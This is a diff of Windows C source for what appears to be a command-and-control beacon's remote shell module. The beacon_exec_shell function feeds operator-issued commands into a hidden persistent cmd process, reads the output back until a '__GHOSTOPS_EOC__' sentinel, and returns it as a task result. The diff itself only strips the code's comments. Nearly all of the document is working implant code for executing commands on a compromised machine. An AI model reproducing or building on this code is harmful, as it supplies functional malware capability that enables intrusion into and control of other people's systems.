@@ -6,7 +6,7 @@
 #define SENTINEL_CMD    "echo " SENTINEL "\r\n"
 #define TIMEOUT_MS      30000
 #define POLL_MS         50
-#define SHELL_OUT_MAX   (8u * 1024u * 1024u)   /* 8 MB growth cap */
+#define SHELL_OUT_MAX   (8u * 1024u * 1024u)
 
 static HANDLE g_hProc    = NULL;
 static HANDLE g_hStdinW  = NULL;
@@ -22,9 +22,6 @@ static BOOL shell_alive(void) {
     return g_hProc && WaitForSingleObject(g_hProc, 0) == WAIT_TIMEOUT;
 }
 
-/* Read stdout into a growable heap buffer until SENTINEL or timeout.
-   *buf and *cap are updated if the buffer is reallocated.
-   Returns total bytes written (buffer is NUL-terminated). */
 static DWORD shell_read_sentinel(char **buf, DWORD *cap, DWORD timeout_ms) {
     DWORD    total    = 0;
     ULONGLONG deadline = GetTickCount64() + timeout_ms;
@@ -34,12 +31,11 @@ static DWORD shell_read_sentinel(char **buf, DWORD *cap, DWORD timeout_ms) {
         if (!PeekNamedPipe(g_hStdoutR, NULL, 0, NULL, &avail, NULL)) break;
         if (avail == 0) { Sleep(POLL_MS); continue; }
 
-        /* grow buffer if needed, respecting hard cap */
         if (total + avail + 1 > *cap) {
             DWORD new_cap = *cap;
             while (new_cap < total + avail + 1) new_cap *= 2;
             if (new_cap > SHELL_OUT_MAX) new_cap = SHELL_OUT_MAX;
-            if (new_cap <= *cap) break; /* already at cap */
+            if (new_cap <= *cap) break;
             char *tmp = (char *)HeapReAlloc(GetProcessHeap(), 0, *buf, new_cap);
             if (!tmp) break;
             *buf = tmp;
@@ -100,7 +96,6 @@ static BOOL shell_spawn(void) {
     DWORD w = 0;
     WriteFile(g_hStdinW, init, (DWORD)strlen(init), &w, NULL);
 
-    /* drain banner using a temporary heap buffer */
     DWORD drain_cap = 4096;
     char *drain = (char *)HeapAlloc(GetProcessHeap(), 0, drain_cap);
     if (drain) {
@@ -123,7 +118,6 @@ static void shell_ensure(void) {
     }
 }
 
-/* ── task entry point ───────────────────────────────────── */
 void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) {
     (void)ctx;
 
@@ -137,7 +131,6 @@ void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) 
     const char *cmd    = task->args ? task->args : "";
     DWORD       cmd_ln = task->args ? (DWORD)task->args_len : 0;
 
-    /* build: <cmd>\r\necho __GHOSTOPS_EOC__\r\n */
     DWORD line_sz = cmd_ln + (DWORD)sizeof(SENTINEL_CMD) + 4;
     char *line = (char *)HeapAlloc(GetProcessHeap(), 0, line_sz);
     if (!line) {
@@ -150,10 +143,8 @@ void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) 
     WriteFile(g_hStdinW, line, (DWORD)line_len, &written, NULL);
     HeapFree(GetProcessHeap(), 0, line);
 
-    /* read output — buffer grows dynamically up to SHELL_OUT_MAX */
     DWORD total = shell_read_sentinel(&result->output, &result->output_cap, TIMEOUT_MS);
 
-    /* strip sentinel line and trailing whitespace */
     char *pos = strstr(result->output, SENTINEL);
     if (pos) {
         char *sol = pos;
